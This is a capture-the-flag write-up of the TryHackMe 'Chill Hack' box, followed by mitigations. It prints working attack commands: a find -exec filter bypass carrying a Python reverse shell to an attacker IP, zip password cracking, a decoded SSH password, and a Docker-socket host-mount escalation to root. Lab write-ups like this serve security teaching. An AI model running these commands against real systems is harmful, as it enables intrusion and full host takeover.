```
  ██████╗██╗  ██╗██╗██╗     ██╗         ██╗  ██╗ █████╗  ██████╗██╗  ██╗
 ██╔════╝██║  ██║██║██║     ██║         ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
 ██║     ███████║██║██║     ██║         ███████║███████║██║     █████╔╝
 ██║     ██╔══██║██║██║     ██║         ██╔══██║██╔══██║██║     ██╔═██╗
 ╚██████╗██║  ██║██║███████╗███████╗    ██║  ██║██║  ██║╚██████╗██║  ██╗
  ╚═════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
              TryHackMe: Chill Hack
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-23 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Medium | ⭐ **Rating:** ⭐⭐⭐☆☆

> ⏱️ ~14 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] Port scan: FTP (21), SSH (22), HTTP (80)
- [x] Anonymous FTP → `note.txt` hinting at command filtering on `/secret/`
- [x] Feroxbuster: found `/secret/` and `/files/` directories
- [x] `/secret/` command panel: most commands filtered, `find` allowed
- [x] `find -exec` Python reverse shell bypass → shell as `www-data`
- [x] Found `/var/www/files/hacker.php`: hint pointing to a hidden image
- [x] Served `/var/www/files/images/` via Python HTTP server
- [x] Downloaded `hacker-with-laptop...jpg`: extracted hidden zip via steghide
- [x] Cracked steghide passphrase indirectly: zip was separately password protected
- [x] `zip2john` + John the Ripper → zip password `pass1word`
- [x] Extracted `source_code.php` → found base64-encoded password in source
- [x] Decoded → `anurodh`'s SSH password
- [x] SSH login as `anurodh`: ran LinPEAS
- [x] LinPEAS flagged writable Docker socket
- [x] Docker container mount escape (`-v /:/host chroot`) → root
- [x] Retrieved root and user flags

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap: port scanning and service detection
- 🕷️ Feroxbuster: web directory enumeration
- 📂 FTP client: anonymous login and note retrieval
- 🐍 Python `find -exec`: command filter bypass for reverse shell
- 🌐 Python HTTP server: exfiltrating an image file for local analysis
- 🔍 Steghide: extracting hidden zip data from a JPEG
- 🔓 zip2john + John the Ripper: zip password cracking
- 🐳 Docker: writable socket privilege escalation
- 🔑 SSH: authenticated user shell

---

## ⚡ TL;DR

A command execution panel filtered most shell commands but missed `find`, which was abused via `-exec` to spawn a Python reverse shell. A hint file led to an image hiding a password-protected zip (steghide → John cracked the zip password). Inside the zip, PHP source code contained a base64-encoded password that decoded to SSH credentials. From there, LinPEAS flagged a writable Docker socket: mounting the host filesystem into a new container and `chroot`-ing into it delivered an instant root shell.

---

## 📖 Introduction

Today's target is **Chill Hack**: a box built by someone who clearly enjoys layering puzzles: a command filter that misses one critical binary, a hint hidden behind an in-joke image, steganography wrapping a password-protected archive, and PHP source code with a base64-encoded credential sitting in plain sight. The escalation path drops all the cleverness for something blunt and devastating: a writable Docker socket, which is essentially a root shell with extra steps. The box rewards patience through the puzzle chain and then hands you the keys outright once you're in the right group.

### Prerequisites

Readers are assumed to know:

- How command injection filters work and why allowlist-vs-denylist matters (recurring theme across this series)
- What `find -exec` does and why it's a powerful command execution primitive
- What steghide is and how steganography conceals data inside image files
- What a writable Docker socket grants and why mounting the host filesystem into a container is a root escalation

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan

```bash
rustscan -a 10.48.166.24 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
```

| Port | Service | Version |
| --- | --- | --- |
| 21/tcp | FTP | vsftpd 3.0.5: anonymous allowed |
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80/tcp | HTTP | Apache httpd 2.4.41 (Ubuntu): "Game Info" |

### Anonymous FTP

```bash
ftp 10.48.166.24
ftp> get note.txt
```

```
Anurodh told me that there is some filtering on strings being put in the
command -- Apaar
```

A direct hint: there's a command execution interface somewhere, and it filters input. Worth remembering the two named users: `Anurodh` and `Apaar`: for later credential attempts.

### Web Directory Enumeration

```bash
feroxbuster -u http://10.48.166.24 -w /usr/share/wordlists/dirb/common.txt -x php,xt,html
```

```
301  /secret           # ^^^ the command panel
200  /secret/index.php
301  /css /images /js  # noise: full sports template site
```

`/secret/` is a single input field plus an execute button. Testing `ls` directly returns: *"are you a hacker?"*: confirming command filtering is active, consistent with the FTP note.

---

## 🚪 Foothold

*(~10 mins into the box)*

### Command Filter Bypass: find -exec

Testing individual commands one at a time against the filter, every common command (`ls`, `cat`, `whoami`, etc.) was blocked. `find` was not.

**Why does this matter?** `find` accepts an `-exec` flag that runs an arbitrary command for each matched file, with `{}` substituted for the matched path and `\;` terminating the exec clause. Pointing `find` directly at a known binary path (rather than searching anything) turns it into a generic command runner: completely bypassing any filter that's only checking for specific blocked command names, since `find` itself isn't one of them.

*The bypass payload:*

```bash
find /usr/bin/python3 -exec {} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.134.217",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' \;
```

This finds exactly one file (`/usr/bin/python3` itself, matched directly by path) and executes it with a Python reverse shell one-liner as the argument.

*Listener and result:*

```bash
nc -nvlp 4444
```

```
connect to [192.168.134.217] from (UNKNOWN) [10.48.166.24] 52936
```

*Stabilising: `python` wasn't found by name (only `python3` exists), so the `script` fallback was used:*

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

```
www-data@ip-10-48-166-24:/var/www/html/secret$
```

---

## 🐚 Shell / Access: The Steganography Chain

*(~20 mins into the box)*

### Home Directory Survey

```bash
ls /home
# anurodh  apaar  aurick  ubuntu

ls /home/apaar
# local.txt   (permission denied to read directly)
```

`anurodh` and `aurick` are both fully permission-denied even for directory listing. `apaar`'s `local.txt` (the user flag) is visible but unreadable as `www-data`.

### Hint File: hacker.php

```bash
cd /var/www/files
ls
# account.php  hacker.php  images  index.php  style.css

cat hacker.php
```

```html
<h1>You have reached this far.</h1>
<h1>Look in the dark! You will find your answer</h1>
```

A direct pointer toward steganography: "look in the dark" combined with an image-heavy page is a strong genre signal. Two images sit in `images/`.

### Exfiltrating the Image

```bash
cd /var/www/files
python3 -m http.server &
```

*Downloading from the attacking machine:*

```bash
wget http://10.48.166.24:8000/images/hacker-with-laptop_23-2147985341.jpg
```

### Steganography: Steghide Extraction

```bash
steghide extract -sf hacker-with-laptop_23-2147985341.jpg -xf hidden_data.txt
```

No passphrase was required (empty passphrase accepted). The extracted file:

```bash
file hidden_data.txt
# Zip archive data
```

A zip archive was hidden inside the JPEG via steghide, but the zip itself is separately password-protected:

```bash
unzip hidden_data.txt
# [hidden_data.txt] source_code.php password:
# skipping: source_code.php   incorrect password
```

### Zip Password Cracking

```bash
zip2john hidden_data.txt > input_john.txt
john -w=/usr/share/wordlists/rockyou.txt input_john.txt
```

```
pass1word   (hidden_data.txt/source_code.php)
```

```bash
unzip hidden_data.txt
# Password: pass1word
# inflating: source_code.php
```

### Source Code: Base64 Credential

```bash
cat source_code.php
```

The PHP implements a login form with OTP email verification. The critical line:

```php
if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
```

The password check compares against a fixed base64 string: meaning the actual plaintext password is recoverable by decoding it directly:

```bash
echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d
# !d0ntKn0wmYp@ssw0rd
```

### Credentials Found

| Username | Password | Where Found |
| --- | --- | --- |
| `anurodh` | `!d0ntKn0wmYp@ssw0rd` | Base64-encoded comparison string in `source_code.php` |

*SSH login:*

```bash
ssh anurodh@10.48.166.24
# Password: !d0ntKn0wmYp@ssw0rd
```

```
anurodh@ip-10-48-166-24:~$
```

---

## 📈 Escalation

*(~35 mins into the box)*

### LinPEAS: Writable Docker Socket

```bash
curl -O https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
bash linpeas.sh
```

LinPEAS flags a **writable Docker socket** (`/var/run/docker.sock`): a well-known critical finding documented on HackTricks.

**Why is a writable Docker socket equivalent to root?** Docker containers, by design, run with substantial privileges and can mount arbitrary host paths into their filesystem. If a non-root user can talk to the Docker daemon (via socket access), they can instruct it to start a new container with the entire host root filesystem (`/`) bind-mounted inside, then `chroot` into that mount: giving them a root-equivalent view of and write access to the real host filesystem, entirely bypassing normal Linux permission checks.

*Checking available images:*

```bash
docker images
# alpine        latest
# hello-world   latest
```

*The escalation: mounting host root into an Alpine container and chrooting into it:*

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash
```

```
root@7ac6b0d2360a:/# cd /root
root@7ac6b0d2360a:~# cat proof.txt
{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
```

The container's `root` is mapped directly onto the host's real root filesystem via the chroot: this is genuinely the host's `/root`, not a container's isolated one.

*Collecting the user flag, now accessible as root:*

```bash
cat /home/apaar/local.txt
# {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

---

## 💥 Exploitation

The complete attack chain:

1. **Anonymous FTP** → `note.txt` hints at command filtering on a panel
2. **`/secret/` command panel** → `find -exec` bypasses the filter → Python reverse shell → `www-data`
3. **`hacker.php`** hint → image hiding a steghide-embedded zip
4. **Steghide extraction** → password-protected zip → `zip2john` + John → `pass1word`
5. **`source_code.php`** → base64-encoded password comparison → decoded → `anurodh`'s SSH password
6. **SSH as `anurodh`** → LinPEAS → writable Docker socket flagged
7. **Docker host-mount + chroot** → root → both flags retrieved

---

## 🐇 Rabbit Holes

### `/home/anurodh` and `/home/aurick`: Permission Denied

Both directories were completely inaccessible from `www-data`, including directory listing itself (not just file contents). No path forward existed there until escalating further: confirmed as dead ends early rather than spending more time probing.

### Broken Pipe on the Python HTTP Server

The Python HTTP server serving `/var/www/files/images/` threw a `BrokenPipeError` mid-transfer on one request. This didn't affect the actual file transfer: the subsequent `wget` from the attacking machine completed successfully on a fresh request. Broken pipe errors on Python's built-in HTTP server are typically harmless client-disconnect artefacts, not corruption of the served file.

### steghide Extraction Required No Passphrase

The steghide extraction step succeeded with no passphrase entered at all: `steghide` happily extracts data embedded with an empty passphrase. This wasn't a stumble exactly, but worth noting: not every steghide-protected file in CTF challenges actually requires a meaningful passphrase to be supplied.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `e8vpd3323cfvlp0qpxxx9qtr5iq37oww` | `/home/apaar/local.txt` |
| Root | `w18gfpn9xehsgd3tovhk0hby4gdp89bg` | `/root/proof.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| Command filter using a denylist that missed `find` | Critical | Use an allowlist of explicitly permitted commands rather than trying to block dangerous ones; `find -exec`, `awk`, `vim`, and dozens of other binaries can run arbitrary commands |
| Sensitive data hidden in an image accessible from the webroot | Medium | Never rely on steganography or obscurity for actual access control; if a file must remain confidential, it shouldn't be served by the web server at all |
| Password stored as a base64 comparison in PHP source | Critical | Base64 is encoding, not encryption: it's instantly reversible; use a proper salted password hash (bcrypt/Argon2) for any credential comparison |
| Writable Docker socket accessible to a non-root user | Critical | Never grant socket access to the Docker daemon to non-root users without equivalent trust to root; if Docker access is required, use rootless Docker or strictly scoped API permissions |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** Access to the Docker socket is equivalent to root access on the host: there is no meaningful distinction. Any user who can run `docker` commands against `/var/run/docker.sock` can mount the entire host filesystem into a container and walk straight through every permission boundary that would otherwise apply. Treat Docker group membership and socket access with exactly the same caution as a `sudo` grant to `/bin/bash`.

---

## 🔁 If I Did It Again

Check `groups` and `ls -la /var/run/docker.sock` immediately after landing a shell as a named user: Docker socket access is one of the highest-value, fastest-to-check privilege escalation primitives, and it should be near the top of any post-landing checklist alongside `sudo -l` and SUID enumeration.

---

## 🔚 Changelog

*Last updated: 2026-06-23*

---

[↑ Back to top](#)
